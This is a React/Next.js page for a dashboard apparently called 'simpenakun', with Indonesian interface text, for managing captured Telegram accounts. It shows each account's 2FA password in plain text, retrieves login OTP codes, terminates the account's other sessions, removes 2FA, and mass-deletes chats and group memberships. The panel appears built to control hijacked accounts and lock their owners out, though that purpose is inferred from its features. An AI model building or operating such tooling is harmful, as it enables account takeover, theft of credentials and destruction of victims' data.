"use client";

import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Loading } from "@/components/loading";
import api from "@/lib/api";
import type { AccountItem, AccountDetail } from "@/types";
import {
  Loader2,
  ShieldBan,
  ShieldCheck,
  X,
  Phone,
  User,
  Calendar,
  Key,
  Trash2,
  LogOut,
  Copy,
  Check,
  Monitor,
  MessageSquareX,
  Lock,
  ArrowLeft,
} from "lucide-react";

interface SessionItem {
  hash: string;
  device_model: string;
  platform: string;
  system_version: string;
  app_name: string;
  app_version: string;
  ip: string;
  country: string;
  current: boolean;
}

export default function AccountsPage() {
  const [accounts, setAccounts] = useState<AccountItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [successMsg, setSuccessMsg] = useState("");
  const [actionLoading, setActionLoading] = useState<number | null>(null);
  const [syncing, setSyncing] = useState(false);
  const [syncDelay, setSyncDelay] = useState(2);

  // Detail modal
  const [selectedAccount, setSelectedAccount] = useState<AccountDetail | null>(null);
  const [detailLoading, setDetailLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);

  // Confirmations
  const [confirmAction, setConfirmAction] = useState<"delete" | "logout" | "clear-chats" | "delete-2fa" | null>(null);
  const [actionProcessing, setActionProcessing] = useState(false);

  // OTP
  const [otpCode, setOtpCode] = useState<string | null>(null);
  const [otpLoading, setOtpLoading] = useState(false);
  const [otpCopied, setOtpCopied] = useState(false);

  // Sessions
  const [sessions, setSessions] = useState<SessionItem[]>([]);
  const [sessionsLoading, setSessionsLoading] = useState(false);
  const [showSessions, setShowSessions] = useState(false);
  const [terminatingHash, setTerminatingHash] = useState<string | null>(null);

  useEffect(() => {
    fetchAccounts();
  }, []);

  const showSuccess = (msg: string) => {
    setSuccessMsg(msg);
    setTimeout(() => setSuccessMsg(""), 4000);
  };

  const getAuthHeaders = () => {
    const token = localStorage.getItem("simpenakun_token");
    return {
      "Content-Type": "application/json",
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    };
  };

  const fetchAccounts = async () => {
    try {
      const response = await api.get("/accounts/");
      const resData = response.data;
      if (Array.isArray(resData)) setAccounts(resData);
      else if (resData && Array.isArray(resData.data)) setAccounts(resData.data);
      else if (resData && Array.isArray(resData.accounts)) setAccounts(resData.accounts);
      else setAccounts([]);
    } catch (err: any) {
      setError("Gagal memuat daftar akun.");
    } finally {
      setLoading(false);
    }
  };

  const fetchAccountDetail = async (userId: number) => {
    setDetailLoading(true);
    setShowModal(true);
    setError("");
    setOtpCode(null);
    setConfirmAction(null);
    setShowSessions(false);
    setSessions([]);
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${userId}`,
        { method: "GET", headers: getAuthHeaders(), redirect: "follow" }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      setSelectedAccount(await res.json());
    } catch (err: any) {
      setError("Gagal memuat detail akun.");
      setShowModal(false);
    } finally {
      setDetailLoading(false);
    }
  };

  const handleBlacklist = async (userId: number, action: "add" | "remove") => {
    setActionLoading(userId);
    try {
      await api.post(`/accounts/blacklist/${action}`, { ids: [userId] });
      await fetchAccounts();
      if (selectedAccount && selectedAccount.user_id === userId) {
        setSelectedAccount({ ...selectedAccount, is_blacklisted: action === "add" });
      }
    } catch (err: any) {
      setError(`Gagal ${action === "add" ? "menambahkan" : "menghapus"} blacklist.`);
    } finally {
      setActionLoading(null);
    }
  };

  const handleGetOtp = async () => {
    if (!selectedAccount) return;
    setOtpLoading(true);
    setOtpCode(null);
    setError("");
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/get-otp`,
        { method: "POST", headers: getAuthHeaders() }
      );
      const data = await res.json();
      if (data.success) setOtpCode(data.message);
      else setError(data.message || "Tidak ada OTP code ditemukan.");
    } catch (err: any) {
      setError("Gagal mengambil OTP code.");
    } finally {
      setOtpLoading(false);
    }
  };

  const handleLogout = async () => {
    if (!selectedAccount) return;
    setActionProcessing(true);
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/logout`,
        { method: "POST", headers: getAuthHeaders() }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      showSuccess("Akun berhasil di-logout.");
      setConfirmAction(null);
      closeModal();
      await fetchAccounts();
    } catch (err: any) {
      setError("Gagal logout akun.");
    } finally {
      setActionProcessing(false);
    }
  };

  const handleDeleteAccount = async () => {
    if (!selectedAccount) return;
    setActionProcessing(true);
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}`,
        { method: "DELETE", headers: getAuthHeaders() }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      showSuccess("Sesi akun berhasil dihapus.");
      setConfirmAction(null);
      closeModal();
      await fetchAccounts();
    } catch (err: any) {
      setError("Gagal menghapus akun.");
    } finally {
      setActionProcessing(false);
    }
  };

  const handleClearChats = async () => {
    if (!selectedAccount) return;
    setActionProcessing(true);
    setError("");
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/clear-chats`,
        { method: "POST", headers: getAuthHeaders() }
      );
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || `HTTP ${res.status}`);
      showSuccess(data.message || "Chats berhasil di-clear.");
      setConfirmAction(null);
    } catch (err: any) {
      setError(err.message || "Gagal clear chats.");
    } finally {
      setActionProcessing(false);
    }
  };

  const handleDelete2FA = async () => {
    if (!selectedAccount) return;
    setActionProcessing(true);
    setError("");
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/delete-2fa`,
        { method: "POST", headers: getAuthHeaders() }
      );
      const data = await res.json();
      if (!res.ok) throw new Error(data.message || `HTTP ${res.status}`);
      showSuccess(data.message || "2FA berhasil dihapus.");
      setConfirmAction(null);
    } catch (err: any) {
      setError(err.message || "Gagal hapus 2FA.");
    } finally {
      setActionProcessing(false);
    }
  };

  const handleListSessions = async () => {
    if (!selectedAccount) return;
    setSessionsLoading(true);
    setShowSessions(true);
    setError("");
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/sessions`,
        { method: "GET", headers: getAuthHeaders() }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setSessions(data.sessions || []);
    } catch (err: any) {
      setError("Gagal memuat sessions.");
      setShowSessions(false);
    } finally {
      setSessionsLoading(false);
    }
  };

  const handleTerminateSession = async (hash: string) => {
    if (!selectedAccount) return;
    setTerminatingHash(hash);
    try {
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/${selectedAccount.user_id}/sessions/${hash}/terminate`,
        { method: "POST", headers: getAuthHeaders() }
      );
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      setSessions((prev) => prev.filter((s) => s.hash !== hash));
      showSuccess("Session terminated.");
    } catch (err: any) {
      setError("Gagal terminate session.");
    } finally {
      setTerminatingHash(null);
    }
  };

  const copyOtp = () => {
    if (otpCode) {
      navigator.clipboard.writeText(otpCode);
      setOtpCopied(true);
      setTimeout(() => setOtpCopied(false), 2000);
    }
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedAccount(null);
    setConfirmAction(null);
    setOtpCode(null);
    setShowSessions(false);
    setSessions([]);
  };

  const handleSyncProfiles = async () => {
    setSyncing(true);
    setError("");
    try {
      const token = localStorage.getItem("simpenakun_token");
      const res = await fetch(
        `https://api.simpenakun.site/api/accounts/sync-profiles?delay=${syncDelay}`,
        { method: "POST", headers: { "Content-Type": "application/json", ...(token ? { Authorization: `Bearer ${token}` } : {}) } }
      );
      const data = await res.json();
      if (data.success) {
        showSuccess(data.message || "Sync selesai!");
        await fetchAccounts();
      } else {
        setError(data.message || "Sync gagal.");
      }
    } catch (err: any) {
      setError("Gagal sync profiles.");
    } finally {
      setSyncing(false);
    }
  };

  if (loading) return <Loading />;

  if (error && accounts.length === 0) {
    return (
      <div className="flex h-64 items-center justify-center">
        <p className="text-destructive">{error}</p>
      </div>
    );
  }

  // Confirmation dialog labels
  const confirmLabels: Record<string, { title: string; action: () => void }> = {
    logout: { title: "Yakin logout akun ini dari Telegram dan hapus dari database?", action: handleLogout },
    delete: { title: "Yakin hapus akun ini dari database (clear sesi)?", action: handleDeleteAccount },
    "clear-chats": { title: "Yakin leave semua group/channel dan hapus semua private chat? Proses ini bisa memakan waktu lama.", action: handleClearChats },
    "delete-2fa": { title: "Yakin hapus 2FA password dari akun ini?", action: handleDelete2FA },
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <h2 className="text-2xl font-bold tracking-tight">Accounts</h2>
          <p className="text-muted-foreground">
            Kelola akun Telegram yang terdaftar ({accounts.length} akun)
          </p>
        </div>
        <div className="flex items-center gap-2">
          <select
            className="h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
            value={syncDelay}
            onChange={(e) => setSyncDelay(Number(e.target.value))}
            disabled={syncing}
          >
            <option value={2}>2s delay</option>
            <option value={3}>3s delay</option>
            <option value={5}>5s delay</option>
            <option value={10}>10s delay</option>
          </select>
          <Button onClick={handleSyncProfiles} disabled={syncing}>
            {syncing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <User className="mr-2 h-4 w-4" />}
            {syncing ? "Syncing..." : "Sync All"}
          </Button>
        </div>
      </div>

      {error && <p className="text-sm text-destructive">{error}</p>}
      {successMsg && <p className="text-sm text-green-500">{successMsg}</p>}
      {syncing && (
        <p className="text-sm text-muted-foreground">
          Estimasi: ~{Math.ceil((accounts.length * syncDelay) / 60)} menit ({accounts.length} akun × {syncDelay}s)
        </p>
      )}

      <Card>
        <CardHeader>
          <CardTitle>Daftar Akun</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b">
                  <th className="px-4 py-3 text-left font-medium">User ID</th>
                  <th className="px-4 py-3 text-left font-medium">Name</th>
                  <th className="px-4 py-3 text-left font-medium">Phone</th>
                  <th className="px-4 py-3 text-left font-medium">Session</th>
                  <th className="px-4 py-3 text-left font-medium">Status</th>
                  <th className="px-4 py-3 text-right font-medium">Aksi</th>
                </tr>
              </thead>
              <tbody>
                {accounts.map((account) => (
                  <tr
                    key={account.user_id}
                    className="border-b cursor-pointer hover:bg-accent/50 transition-colors"
                    onClick={() => fetchAccountDetail(account.user_id)}
                  >
                    <td className="px-4 py-3 font-mono">{account.user_id}</td>
                    <td className="px-4 py-3 text-sm">
                      {account.first_name || <span className="text-muted-foreground">Not synced</span>}
                      {account.username && <span className="text-xs text-muted-foreground ml-1">@{account.username}</span>}
                    </td>
                    <td className="px-4 py-3 font-mono text-xs">{account.phone_number || "-"}</td>
                    <td className="px-4 py-3">
                      <Badge variant={account.session_exists ? "default" : "secondary"}>
                        {account.session_exists ? "Active" : "Inactive"}
                      </Badge>
                    </td>
                    <td className="px-4 py-3">
                      <Badge variant={account.is_blacklisted ? "destructive" : "outline"}>
                        {account.is_blacklisted ? "Blacklisted" : "Normal"}
                      </Badge>
                    </td>
                    <td className="px-4 py-3 text-right">
                      {account.is_blacklisted ? (
                        <Button size="sm" variant="outline" onClick={(e) => { e.stopPropagation(); handleBlacklist(account.user_id, "remove"); }} disabled={actionLoading === account.user_id}>
                          {actionLoading === account.user_id ? <Loader2 className="mr-1 h-3 w-3 animate-spin" /> : <ShieldCheck className="mr-1 h-3 w-3" />}
                          Unblock
                        </Button>
                      ) : (
                        <Button size="sm" variant="destructive" onClick={(e) => { e.stopPropagation(); handleBlacklist(account.user_id, "add"); }} disabled={actionLoading === account.user_id}>
                          {actionLoading === account.user_id ? <Loader2 className="mr-1 h-3 w-3 animate-spin" /> : <ShieldBan className="mr-1 h-3 w-3" />}
                          Blacklist
                        </Button>
                      )}
                    </td>
                  </tr>
                ))}
                {accounts.length === 0 && (
                  <tr><td colSpan={6} className="px-4 py-8 text-center text-muted-foreground">Belum ada akun terdaftar.</td></tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>

      {/* Account Detail Modal */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="fixed inset-0 bg-black/50" onClick={closeModal} />
          <div className="relative z-50 w-full max-w-lg max-h-[90vh] overflow-y-auto rounded-lg border bg-card p-6 shadow-lg mx-4">
            <Button variant="ghost" size="icon" className="absolute right-4 top-4" onClick={closeModal}>
              <X className="h-4 w-4" />
            </Button>

            {/* Sessions sub-panel */}
            {showSessions ? (
              <div className="space-y-4">
                <div className="flex items-center gap-2">
                  <Button variant="ghost" size="icon" onClick={() => setShowSessions(false)}>
                    <ArrowLeft className="h-4 w-4" />
                  </Button>
                  <h3 className="text-lg font-semibold">Active Sessions</h3>
                </div>

                {sessionsLoading ? (
                  <Loading />
                ) : sessions.length === 0 ? (
                  <p className="text-center text-muted-foreground py-4">Tidak ada session aktif.</p>
                ) : (
                  <div className="space-y-3">
                    {sessions.map((session) => (
                      <div key={session.hash} className="rounded-md border p-3 space-y-1">
                        <div className="flex items-start justify-between">
                          <div>
                            <p className="font-medium text-sm">
                              {session.app_name} {session.app_version}
                              {session.current && <Badge variant="default" className="ml-2 text-xs">Current</Badge>}
                            </p>
                            <p className="text-xs text-muted-foreground">{session.device_model} • {session.platform} {session.system_version}</p>
                            <p className="text-xs text-muted-foreground">{session.ip} • {session.country}</p>
                          </div>
                          {!session.current && (
                            <Button
                              size="sm"
                              variant="destructive"
                              onClick={() => handleTerminateSession(session.hash)}
                              disabled={terminatingHash === session.hash}
                            >
                              {terminatingHash === session.hash ? <Loader2 className="h-3 w-3 animate-spin" /> : <X className="h-3 w-3" />}
                            </Button>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ) : (
              <>
                <h3 className="text-lg font-semibold mb-4">Detail Akun</h3>

                {detailLoading ? (
                  <Loading />
                ) : selectedAccount ? (
                  <div className="space-y-4">
                    {/* Info */}
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div className="flex items-center gap-3">
                        <User className="h-4 w-4 text-muted-foreground shrink-0" />
                        <div>
                          <p className="text-xs text-muted-foreground">User ID</p>
                          <p className="font-mono font-medium text-sm">{selectedAccount.user_id}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        <Phone className="h-4 w-4 text-muted-foreground shrink-0" />
                        <div>
                          <p className="text-xs text-muted-foreground">Phone</p>
                          <p className="font-mono text-sm">{selectedAccount.phone_number || "-"}</p>
                        </div>
                      </div>
                      {selectedAccount.old_phone_number && (
                        <div className="flex items-center gap-3">
                          <Phone className="h-4 w-4 text-muted-foreground shrink-0" />
                          <div>
                            <p className="text-xs text-muted-foreground">Old Phone</p>
                            <p className="font-mono text-sm">{selectedAccount.old_phone_number}</p>
                          </div>
                        </div>
                      )}
                      <div className="flex items-center gap-3">
                        <Key className="h-4 w-4 text-muted-foreground shrink-0" />
                        <div>
                          <p className="text-xs text-muted-foreground">2FA Password</p>
                          <p className="font-mono text-sm">{selectedAccount.password || "n/a"}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        <Calendar className="h-4 w-4 text-muted-foreground shrink-0" />
                        <div>
                          <p className="text-xs text-muted-foreground">Date</p>
                          <p className="text-sm">{selectedAccount.date ? new Date(selectedAccount.date).toLocaleString("id-ID") : "-"}</p>
                        </div>
                      </div>
                    </div>

                    {/* Badges */}
                    <div className="flex flex-wrap gap-2">
                      <Badge variant={selectedAccount.session_exists ? "default" : "secondary"}>
                        Session: {selectedAccount.session_exists ? "Yes" : "No"}
                      </Badge>
                      <Badge variant={selectedAccount.is_blacklisted ? "destructive" : "outline"}>
                        {selectedAccount.is_blacklisted ? "Blacklisted" : "Normal"}
                      </Badge>
                      {selectedAccount.is_number_changed && <Badge variant="secondary">Number Changed</Badge>}
                    </div>

                    {/* OTP Display */}
                    {otpCode && (
                      <div className="rounded-md border border-green-500/50 bg-green-500/10 p-4 text-center">
                        <p className="text-xs text-muted-foreground mb-1">OTP Code</p>
                        <p className="text-3xl font-bold font-mono tracking-widest">{otpCode}</p>
                        <Button variant="ghost" size="sm" className="mt-2" onClick={copyOtp}>
                          {otpCopied ? <Check className="mr-1 h-3 w-3" /> : <Copy className="mr-1 h-3 w-3" />}
                          {otpCopied ? "Copied!" : "Copy"}
                        </Button>
                      </div>
                    )}

                    {/* Confirmation */}
                    {confirmAction && confirmLabels[confirmAction] && (
                      <div className="rounded-md border border-destructive p-3 space-y-3">
                        <p className="text-sm text-destructive font-medium">{confirmLabels[confirmAction].title}</p>
                        {actionProcessing && confirmAction === "clear-chats" && (
                          <p className="text-xs text-muted-foreground">Sedang memproses, bisa memakan waktu lama...</p>
                        )}
                        <div className="flex gap-2">
                          <Button variant="destructive" size="sm" className="flex-1" onClick={confirmLabels[confirmAction].action} disabled={actionProcessing}>
                            {actionProcessing ? <Loader2 className="mr-1 h-3 w-3 animate-spin" /> : <Trash2 className="mr-1 h-3 w-3" />}
                            Ya, Lanjutkan
                          </Button>
                          <Button variant="outline" size="sm" className="flex-1" onClick={() => setConfirmAction(null)} disabled={actionProcessing}>
                            Batal
                          </Button>
                        </div>
                      </div>
                    )}

                    {/* Actions */}
                    <div className="space-y-2 pt-4 border-t">
                      {/* Get OTP - Green */}
                      <Button className="w-full bg-green-600 hover:bg-green-700 text-white" onClick={handleGetOtp} disabled={otpLoading}>
                        {otpLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Key className="mr-2 h-4 w-4" />}
                        Get OTP Code
                      </Button>

                      {/* List Sessions - Blue */}
                      <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white" onClick={handleListSessions}>
                        <Monitor className="mr-2 h-4 w-4" />
                        List Sessions
                      </Button>

                      {/* Blacklist toggle */}
                      {selectedAccount.is_blacklisted ? (
                        <Button variant="outline" className="w-full" onClick={() => handleBlacklist(selectedAccount.user_id, "remove")} disabled={actionLoading === selectedAccount.user_id}>
                          {actionLoading === selectedAccount.user_id ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <ShieldCheck className="mr-2 h-4 w-4" />}
                          Remove from Blacklist
                        </Button>
                      ) : (
                        <Button variant="secondary" className="w-full" onClick={() => handleBlacklist(selectedAccount.user_id, "add")} disabled={actionLoading === selectedAccount.user_id}>
                          {actionLoading === selectedAccount.user_id ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <ShieldBan className="mr-2 h-4 w-4" />}
                          Add to Blacklist
                        </Button>
                      )}

                      {/* Clear Chats - Orange */}
                      {!confirmAction && (
                        <Button variant="outline" className="w-full border-orange-500 text-orange-500 hover:bg-orange-500/10" onClick={() => setConfirmAction("clear-chats")}>
                          <MessageSquareX className="mr-2 h-4 w-4" />
                          Clear Chats
                        </Button>
                      )}

                      {/* Delete 2FA - Orange */}
                      {!confirmAction && (
                        <Button variant="outline" className="w-full border-orange-500 text-orange-500 hover:bg-orange-500/10" onClick={() => setConfirmAction("delete-2fa")}>
                          <Lock className="mr-2 h-4 w-4" />
                          Delete 2FA
                        </Button>
                      )}

                      {/* Logout - Red */}
                      {!confirmAction && (
                        <Button variant="destructive" className="w-full" onClick={() => setConfirmAction("logout")}>
                          <LogOut className="mr-2 h-4 w-4" />
                          Logout Akun
                        </Button>
                      )}

                      {/* Clear Sesi - Red */}
                      {!confirmAction && (
                        <Button variant="destructive" className="w-full" onClick={() => setConfirmAction("delete")}>
                          <Trash2 className="mr-2 h-4 w-4" />
                          Clear Sesi
                        </Button>
                      )}
                    </div>
                  </div>
                ) : null}
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
